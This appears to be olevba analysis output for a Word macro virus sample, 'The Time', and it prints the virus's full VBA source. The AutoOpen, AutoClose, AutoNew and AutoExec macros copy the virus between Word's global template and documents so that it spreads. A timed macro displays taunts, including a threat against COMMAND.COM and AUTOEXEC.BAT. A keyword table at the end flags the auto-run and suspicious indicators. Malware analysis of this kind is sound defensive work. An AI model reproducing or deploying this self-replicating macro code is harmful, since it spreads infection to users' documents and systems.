olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nj-wmdlk1.k
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nj-wmdlk1.k - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO TheTime.bas 
in file: Virus.MSWord.Nj-wmdlk1.k - OLE stream: 'Macros/VBA/TheTime'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
If WordBasic.Hour(WordBasic.Now()) = 15 And WordBasic.Minute(WordBasic.Now()) = 59 Then
Else
GoTo Finish
End If
    WordBasic.Beep
    WordBasic.Beep
    WordBasic.Beep
    WordBasic.Beep
    WordBasic.Beep
    WordBasic.Beep
    WordBasic.Beep
    WordBasic.Beep
    WordBasic.Beep
    WordBasic.Beep
    WordBasic.Beep
    WordBasic.Beep
    WordBasic.Beep
    WordBasic.Beep
    WordBasic.Beep
    WordBasic.Beep
    WordBasic.Beep
    WordBasic.Beep
WordBasic.MsgBox "Hi I´m the Time virus"
WordBasic.Beep
WordBasic.MsgBox " I don´t like Your COMMAND.COM and AUTOEXEC.BAT"
WordBasic.Beep
WordBasic.MsgBox "Play with me !!   :-)  "
WordBasic.Beep
WordBasic.MsgBox " You have 1 Minute time to find me"
WordBasic.Beep
WordBasic.MsgBox " Find me, I do nothing"
WordBasic.Beep
WordBasic.MsgBox " Find me not "
WordBasic.Beep
WordBasic.MsgBox " SAY  BYE  TO  YOUR  COMMAND.COM  AND  AUTOEXEC.BAT"
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep

Finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: Virus.MSWord.Nj-wmdlk1.k - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim i
Dim VInstalled
Dim Erro
On Error GoTo -1: On Error GoTo Finish

For i = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](i, 1, 1) = "TheTime" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Erro Resume Next
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
    WordBasic.MacroCopy "Global:TheTime", WordBasic.[FileName$]() + ":TheTime", 1
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec", 1
    WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", 1
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
    WordBasic.MacroCopy "Global:Kill", WordBasic.[FileName$]() + ":Kill", 1
    WordBasic.FileSaveAll 1, 0
End If

Finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Nj-wmdlk1.k - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim i
Dim VInstalled
On Error GoTo -1: On Error GoTo Finish

For i = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](i, 1, 1) = "TheTime" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
    WordBasic.MacroCopy "Global:TheTime", WordBasic.[FileName$]() + ":TheTime", 1
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec", 1
    WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", 1
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
    WordBasic.MacroCopy "Global:Kill", WordBasic.[FileName$]() + ":Kill", 1
    WordBasic.FileSaveAll 1, 0
End If

Finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Nj-wmdlk1.k - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()

WordBasic.Call "AutoOpen"

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Nj-wmdlk1.k - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim i
Dim VInstalled
WordBasic.ToggleFull
WordBasic.InsertPara
WordBasic.Insert Chr(9) + Chr(9) + Chr(9) + Chr(9) + Chr(9)
WordBasic.Bold
WordBasic.FontSize 18
WordBasic.Insert "You are infected with"
WordBasic.InsertPara
WordBasic.InsertPara
WordBasic.InsertPara
WordBasic.FontSize 72
WordBasic.Insert Chr(9) + Chr(9) + Chr(9) + Chr(9) + "The Time"
WordBasic.InsertPara
WordBasic.InsertPara
WordBasic.InsertPara
WordBasic.FontSize 25
WordBasic.Insert Chr(9) + Chr(9) + Chr(9) + Chr(9) + " A virus from Cool Zero"
WordBasic.InsertPara
WordBasic.InsertPara
WordBasic.InsertPara


    For i = 1 To WordBasic.CountMacros(0, 0)
    If WordBasic.[MacroName$](i, 0, 0) = "TheTime" Then
        VInstalled = 1
        End If
Next i

If VInstalled = 1 Then
        GoTo Finish
Else
    On Error Resume Next
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":TheTime", "Global:TheTime", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "Global:AutoNew", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoExec", "Global:AutoExec", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":Kill", "Global:Kill", 1
End If

Finish2:
On Error GoTo -1: On Error GoTo Finish

For i = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](i, 1, 1) = "TheTime" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
        GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
    WordBasic.MacroCopy "Global:TheTime", WordBasic.[FileName$]() + ":TheTime", 1
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec", 1
    WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", 1
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
    WordBasic.MacroCopy "Global:Kill", WordBasic.[FileName$]() + ":Kill", 1
    WordBasic.FileSaveAll 1, 0
End If

Finish:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

